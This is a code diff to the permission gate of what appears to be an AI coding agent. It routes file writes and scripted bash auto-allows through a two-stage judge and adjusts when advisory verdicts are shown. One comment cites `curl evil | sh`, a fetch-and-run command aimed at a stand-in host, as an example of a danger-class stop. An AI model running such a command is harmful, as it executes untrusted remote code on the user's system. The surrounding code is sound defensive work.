@@ -8,7 +8,8 @@ import type { Store } from "./store";
 import { isDspaActive, recordDspaAutoAllowed, updateDspaWidget } from "./dspa-mode";
 import { isDspatActive } from "./dspat-mode";
 import { checkDspaGate } from "./dspa-gate";
-import { getJudgeVerdict, getStage2Verdict, judgeStatus } from "./judge-prompt";
+import { getJudgeVerdict, getStage2Verdict, judgeStatus, extractScriptPayload } from "./judge-prompt";
+import { PromptFallbackRule } from "./policies/bash-rules";
 import type { JudgeResult } from "./judge";
 
 /** Result of showing a permission prompt. */
@@ -119,11 +120,13 @@ async function tryDspaAutoAllow(
   const pd = decision.promptData;
   const gateResult = await checkDspaGate(pd, store);
   if (!gateResult.ok) {
-    // D10 (docs/dspa-redesign.md): an untrusted package stops the
-    // auto-allow, but the judge still runs — its verdict is advisory
-    // (rendered in the prompt) to inform the Trust/Yes/No decision.
+    // D10/D11 (docs/dspa-redesign.md): scope-class stops (outside base,
+    // unresolvable location) and untrusted packages stop the auto-allow, but
+    // the judge still runs both stages — its verdict renders in the prompt
+    // as advisory input to the allow/deny/grant decision (a verdict on
+    // `curl evil | sh` would be noise — danger-class stops stay bare).
     // Never an auto-allow: the floor's stop stands.
-    if (gateResult.untrustedPackages && gateResult.untrustedPackages.length > 0) {
+    if (gateResult.advisory) {
       const v1 = await getJudgeVerdict(pd, ctx, store);
       const v2 = await getStage2Verdict(pd, ctx, store);
       const final = (v2 ?? v1) ?? null;
@@ -193,16 +196,39 @@ export async function gate(
 ): Promise<undefined | { block: true; reason: string }> {
   let decision = precomputedDecision ?? await gateDecide(request, store, ctx);
 
-  // D3 (docs/dspa-redesign.md): in dspa, a file write into a session-granted
-  // dir is JUDGEABLE, not a blind auto-allow — the dir is trusted, the
-  // content is judged (two stages, same policy as bash). The probe re-decides
-  // with judgeDirGrants: only the dir-grant fast path behaves differently
-  // (project-pi / static / file-level grants still auto-allow → no
-  // conversion). Manual/dspat and non-file decisions are untouched.
+  // D3/D11 (docs/dspa-redesign.md): in dspa, a file WRITE that manual mode
+  // would auto-allow is JUDGEABLE, not a blind auto-allow — the location is
+  // trusted, the content is judged in full (two stages, same policy as
+  // bash). The probe re-decides with judgeWriteAutoAllows: every write
+  // auto-allow fast path converts (reads are never judged). Manual/dspat
+  // and non-file decisions are untouched. Judge off/invalid → no conversion
+  // (degrades to the manual auto-allow — dspa never adds a prompt on its
+  // own; a runtime judge failure still falls toward the prompt, D6).
   if (decision.kind === "auto-allow" && request.type === "file"
-      && request.toolName !== "read" && isDspaActive() && ctx.hasUI) {
-    const probed = await gateDecide(request, store, ctx, { judgeDirGrants: true });
+      && request.toolName !== "read" && isDspaActive() && ctx.hasUI
+      && judgeStatus(ctx).state === "ok") {
+    const probed = await gateDecide(request, store, ctx, { judgeWriteAutoAllows: true });
     if (probed.kind === "prompt") decision = probed;
+  }
+
+  // D11 (docs/dspa-redesign.md): in dspa, a bash auto-allow that runs a
+  // reviewable script payload (granted interpreter execution) is judged —
+  // the grant trusts the command form, the content is still reviewed (two
+  // stages, same policy). The deterministic floor is moot on a manual
+  // auto-allow: it already passed every danger check (canBeAutoAllowed,
+  // credential paths, network, D10 trust). The conversion builds the
+  // manual-shaped prompt (PromptFallbackRule) so the shared dspa block below
+  // handles gate → judge → auto-allow / prompt-with-verdict uniformly.
+  // Payload-less commands and reads are never judged; judge off/invalid →
+  // no conversion (manual auto-allow stands).
+  if (decision.kind === "auto-allow" && request.type === "bash"
+      && isDspaActive() && ctx.hasUI
+      && judgeStatus(ctx).state === "ok") {
+    const analysis = decision.analysis;
+    if (analysis && extractScriptPayload(analysis, request.cwd) !== null) {
+      const synthetic = await PromptFallbackRule(request, store, analysis);
+      if (synthetic?.kind === "prompt") decision = synthetic;
+    }
   }
 
   // /dspa: a prompt decision may be auto-allowed (hard gate + judge). This
